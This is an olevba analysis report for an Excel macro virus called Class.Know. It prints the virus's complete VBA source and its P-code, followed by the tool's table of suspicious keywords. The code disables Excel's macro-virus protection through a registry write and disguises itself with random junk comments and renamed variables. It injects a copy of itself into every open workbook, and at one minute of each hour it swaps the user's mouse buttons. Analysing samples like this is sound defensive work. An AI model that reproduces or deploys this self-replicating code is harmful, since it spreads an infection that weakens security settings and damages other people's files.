olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSExcel.Know
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSExcel.Know - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: ./Virus.MSExcel.Know - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Declare Function SwapMouseButton Lib "user32" (ByVal bSwap As Long) As Long '
Private Sub Workbook_Deactivate() '
On Error Resume Next: Dim Virus(200) '
Set obj = CreateObject("word.application"): obj.system.privateprofilestring("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = &H0: obj.Quit '
Const hostname = "DieseArbeitsmappe" '
Set host = ActiveWorkbook.VBProject.VBComponents(hostname).CodeModule '
OurLines = host.CountOfLines: PiESize = 100 + Int(Rnd * 50): PiEChar = Chr(39) '
For ix = 1 To OurLines: JunkCode = "": PiERnd = Int(Rnd * 3): PiEPos = InStr(host.Lines(ix, 1), PiEChar) '
If PiEPos = 1 And OurLines > PiESize Then PiERnd = 1: GoTo next_ '
Virus(ix) = Left(host.Lines(ix, 1), (PiEPos - 1)) '
For jx = 1 To Int(75 - (Rnd * 20)): JunkCode = JunkCode & Chr(255 - Int(Rnd * 100)): Next '
Virus(ix) = Virus(ix) & PiEChar & JunkCode '
If PiERnd = 2 Then Virus(ix) = Virus(ix) & vbCr & PiEChar & JunkCode '
FullCode = FullCode & Virus(ix) & vbCr '
next_: Next '
Dim VARIABLE(1 To 20) '
VARIABLE(1) = "Virus": VARIABLE(2) = "obj": VARIABLE(3) = "hostname": VARIABLE(4) = "host": VARIABLE(5) = "OurLines": VARIABLE(6) = "PiESize": VARIABLE(7) = "PiEChar": VARIABLE(8) = "ix" '
VARIABLE(9) = "JunkCode": VARIABLE(10) = "PiERnd": VARIABLE(11) = "PiEPos": VARIABLE(12) = "next_": VARIABLE(13) = "jx": VARIABLE(14) = "FullCode": VARIABLE(15) = "VARIABLE": VARIABLE(16) = "OUR_LOOP" '
VARIABLE(17) = "NEW_VAR": VARIABLE(18) = "VAR_POSITION": VARIABLE(19) = "NEXT_LINE": VARIABLE(20) = "target" '
For OUR_LOOP = 1 To 20 '
NEW_VAR = Chr(65 + Int(Rnd * 22)) & Chr(122 - Int(Rnd * 22)) & Int(Rnd * 999) '
VAR_POSITION = 1 '
NEXT_LINE: VAR_POSITION = InStr(VAR_POSITION, FullCode, VARIABLE(OUR_LOOP)) '
If VAR_POSITION <> 0 Then FullCode = Mid(FullCode, 1, (VAR_POSITION - 1)) & NEW_VAR & Mid(FullCode, (VAR_POSITION + Len(VARIABLE(OUR_LOOP))), Len(FullCode)): GoTo NEXT_LINE '
Next '
For Each target In Workbooks '
If target.VBProject.VBComponents(hostname).CodeModule.CountOfLines < 2 Then target.VBProject.VBComponents(hostname).CodeModule.AddFromString FullCode '
Next '
If Minute(Now()) = 23 Then MsgBox "know, you never think you know why", 0, "Class.Know by jackie twoflower /Lz0NT /MVT /CC": SwapMouseButton &H2 '
End Sub '
Rem Class.Know written by jackie twoflower /Lz0NT /MVT /CC '
Rem Uses PiE v2.0 for VBA '
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSExcel.Know
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 917 bytes
' Line #0:
' Macros/VBA/Module1 - 4884 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Declare Function SwapMouseButton Lib "user32" (ByVal bSwap As Long) As Long)
' 	QuoteRem 0x0054 0x0000 ""
' Line #2:
' 	FuncDefn (Private Sub Workbook_Deactivate())
' 	QuoteRem 0x0022 0x0000 ""
' Line #3:
' 	OnError (Resume Next) 
' 	BoS 0x0000 
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x00C8 
' 	VarDefn Virus
' 	QuoteRem 0x0025 0x0000 ""
' Line #4:
' 	SetStmt 
' 	LitStr 0x0010 "word.application"
' 	ArgsLd CreateObject 0x0001 
' 	Set obj 
' 	BoS 0x0000 
' 	LitHI2 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x0045 "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
' 	LitStr 0x0008 "Options6"
' 	Ld obj 
' 	MemLd system 
' 	ArgsMemSt privateprofilestring 0x0003 
' 	BoS 0x0000 
' 	Ld obj 
' 	ArgsMemCall Quit 0x0000 
' 	QuoteRem 0x00B5 0x0000 ""
' Line #5:
' 	Dim (Const) 
' 	LitStr 0x0011 "DieseArbeitsmappe"
' 	VarDefn hostname
' 	QuoteRem 0x0025 0x0000 ""
' Line #6:
' 	SetStmt 
' 	Ld hostname 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set host 
' 	QuoteRem 0x0046 0x0000 ""
' Line #7:
' 	Ld host 
' 	MemLd CountOfLines 
' 	St OurLines 
' 	BoS 0x0000 
' 	LitDI2 0x0064 
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	Add 
' 	St PiESize 
' 	BoS 0x0000 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	St PiEChar 
' 	QuoteRem 0x004F 0x0000 ""
' Line #8:
' 	StartForVariable 
' 	Ld ix 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld OurLines 
' 	For 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St JunkCode 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	St PiERnd 
' 	BoS 0x0000 
' 	Ld ix 
' 	LitDI2 0x0001 
' 	Ld host 
' 	ArgsMemLd Lines 0x0002 
' 	Ld PiEChar 
' 	FnInStr 
' 	St PiEPos 
' 	QuoteRem 0x0069 0x0000 ""
' Line #9:
' 	Ld PiEPos 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld OurLines 
' 	Ld PiESize 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St PiERnd 
' 	BoS 0x0000 
' 	GoTo next_ 
' 	EndIf 
' 	QuoteRem 0x0041 0x0000 ""
' Line #10:
' 	Ld ix 
' 	LitDI2 0x0001 
' 	Ld host 
' 	ArgsMemLd Lines 0x0002 
' 	Ld PiEPos 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	ArgsLd LBound 0x0002 
' 	Ld ix 
' 	ArgsSt Virus 0x0001 
' 	QuoteRem 0x0032 0x0000 ""
' Line #11:
' 	StartForVariable 
' 	Ld jx 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x004B 
' 	Ld Rnd 
' 	LitDI2 0x0014 
' 	Mul 
' 	Paren 
' 	Sub 
' 	FnInt 
' 	For 
' 	BoS 0x0000 
' 	Ld JunkCode 
' 	LitDI2 0x00FF 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St JunkCode 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Next 
' 	QuoteRem 0x005A 0x0000 ""
' Line #12:
' 	Ld ix 
' 	ArgsLd Virus 0x0001 
' 	Ld PiEChar 
' 	Concat 
' 	Ld JunkCode 
' 	Concat 
' 	Ld ix 
' 	ArgsSt Virus 0x0001 
' 	QuoteRem 0x002B 0x0000 ""
' Line #13:
' 	Ld PiERnd 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ix 
' 	ArgsLd Virus 0x0001 
' 	Ld vbCr 
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld JunkCode 
' 	Concat 
' 	Ld ix 
' 	ArgsSt Virus 0x0001 
' 	EndIf 
' 	QuoteRem 0x0045 0x0000 ""
' Line #14:
' 	Ld FullCode 
' 	Ld ix 
' 	ArgsLd Virus 0x0001 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St FullCode 
' 	QuoteRem 0x0027 0x0000 ""
' Line #15:
' 	Label next_ 
' 	StartForVariable 
' 	Next 
' 	QuoteRem 0x000C 0x0000 ""
' Line #16:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0014 
' 	VarDefn VARIABLE
' 	QuoteRem 0x0016 0x0000 ""
' Line #17:
' 	LitStr 0x0005 "Virus"
' 	LitDI2 0x0001 
' 	ArgsSt VARIABLE 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0003 "obj"
' 	LitDI2 0x0002 
' 	ArgsSt VARIABLE 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "hostname"
' 	LitDI2 0x0003 
' 	ArgsSt VARIABLE 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0004 "host"
' 	LitDI2 0x0004 
' 	ArgsSt VARIABLE 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "OurLines"
' 	LitDI2 0x0005 
' 	ArgsSt VARIABLE 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0007 "PiESize"
' 	LitDI2 0x0006 
' 	ArgsSt VARIABLE 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0007 "PiEChar"
' 	LitDI2 0x0007 
' 	ArgsSt VARIABLE 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0002 "ix"
' 	LitDI2 0x0008 
' 	ArgsSt VARIABLE 0x0001 
' 	QuoteRem 0x00BB 0x0000 ""
' Line #18:
' 	LitStr 0x0008 "JunkCode"
' 	LitDI2 0x0009 
' 	ArgsSt VARIABLE 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "PiERnd"
' 	LitDI2 0x000A 
' 	ArgsSt VARIABLE 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "PiEPos"
' 	LitDI2 0x000B 
' 	ArgsSt VARIABLE 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "next_"
' 	LitDI2 0x000C 
' 	ArgsSt VARIABLE 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0002 "jx"
' 	LitDI2 0x000D 
' 	ArgsSt VARIABLE 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "FullCode"
' 	LitDI2 0x000E 
' 	ArgsSt VARIABLE 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "VARIABLE"
' 	LitDI2 0x000F 
' 	ArgsSt VARIABLE 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0008 "OUR_LOOP"
' 	LitDI2 0x0010 
' 	ArgsSt VARIABLE 0x0001 
' 	QuoteRem 0x00C9 0x0000 ""
' Line #19:
' 	LitStr 0x0007 "NEW_VAR"
' 	LitDI2 0x0011 
' 	ArgsSt VARIABLE 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x000C "VAR_POSITION"
' 	LitDI2 0x0012 
' 	ArgsSt VARIABLE 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0009 "NEXT_LINE"
' 	LitDI2 0x0013 
' 	ArgsSt VARIABLE 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "target"
' 	LitDI2 0x0014 
' 	ArgsSt VARIABLE 0x0001 
' 	QuoteRem 0x006D 0x0000 ""
' Line #20:
' 	StartForVariable 
' 	Ld OUR_LOOP 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0014 
' 	For 
' 	QuoteRem 0x0017 0x0000 ""
' Line #21:
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x03E7 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St NEW_VAR 
' 	QuoteRem 0x004E 0x0000 ""
' Line #22:
' 	LitDI2 0x0001 
' 	St VAR_POSITION 
' 	QuoteRem 0x0011 0x0000 ""
' Line #23:
' 	Label NEXT_LINE 
' 	Ld VAR_POSITION 
' 	Ld FullCode 
' 	Ld OUR_LOOP 
' 	ArgsLd VARIABLE 0x0001 
' 	FnInStr3 
' 	St VAR_POSITION 
' 	QuoteRem 0x004C 0x0000 ""
' Line #24:
' 	Ld VAR_POSITION 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld FullCode 
' 	LitDI2 0x0001 
' 	Ld VAR_POSITION 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	ArgsLd Mid$ 0x0003 
' 	Ld NEW_VAR 
' 	Concat 
' 	Ld FullCode 
' 	Ld VAR_POSITION 
' 	Ld OUR_LOOP 
' 	ArgsLd VARIABLE 0x0001 
' 	FnLen 
' 	Add 
' 	Paren 
' 	Ld FullCode 
' 	FnLen 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St FullCode 
' 	BoS 0x0000 
' 	GoTo NEXT_LINE 
' 	EndIf 
' 	QuoteRem 0x00AD 0x0000 ""
' Line #25:
' 	StartForVariable 
' 	Next 
' 	QuoteRem 0x0005 0x0000 ""
' Line #26:
' 	StartForVariable 
' 	Ld target 
' 	EndForVariable 
' 	Ld Workbooks 
' 	ForEach 
' 	QuoteRem 0x001D 0x0000 ""
' Line #27:
' 	Ld hostname 
' 	Ld target 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0002 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld FullCode 
' 	Ld hostname 
' 	Ld target 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' 	QuoteRem 0x0096 0x0000 ""
' Line #28:
' 	StartForVariable 
' 	Next 
' 	QuoteRem 0x0005 0x0000 ""
' Line #29:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Minute 0x0001 
' 	LitDI2 0x0017 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0022 "know, you never think you know why"
' 	LitDI2 0x0000 
' 	LitStr 0x002E "Class.Know by jackie twoflower /Lz0NT /MVT /CC"
' 	ArgsCall MsgBox 0x0003 
' 	BoS 0x0000 
' 	LitHI2 0x0002 
' 	ArgsCall SwapMouseButton 0x0001 
' 	EndIf 
' 	QuoteRem 0x0091 0x0000 ""
' Line #30:
' 	EndSub 
' 	QuoteRem 0x0008 0x0000 ""
' Line #31:
' 	Rem 0x0039 " Class.Know written by jackie twoflower /Lz0NT /MVT /CC '"
' Line #32:
' 	Rem 0x0018 " Uses PiE v2.0 for VBA '"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

